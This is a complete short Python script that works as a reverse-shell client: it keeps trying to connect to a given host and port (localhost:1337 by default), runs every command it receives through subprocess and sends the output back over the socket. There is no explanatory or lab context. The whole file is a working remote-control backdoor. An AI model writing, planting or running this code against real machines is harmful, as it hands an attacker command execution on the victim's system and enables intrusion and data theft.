#!/usr/bin/env python3

import time
import socket
import subprocess as sp

def shexec(command):
    print(f"Executing: {command}")
    return sp.Popen(command.split(), stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.PIPE).communicate()[0].strip()

def connect(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print(f"[+] Attempting to connect to server {host}:{port}")
    while True:
        if s.connect_ex((host, port)) == 0:
            print(f"[+] Connected to server {host}:{port}")
            break
        time.sleep(1)
    return s

def main(host='127.0.0.1', port=1337):
    s = connect(host, port)
    while True:
        # recieve command from server
        command = s.recv(4096).decode('utf-8').strip()
        # execute command & capture output
        output = shexec(command)
        # send output to server
        s.send(output)
        

main()


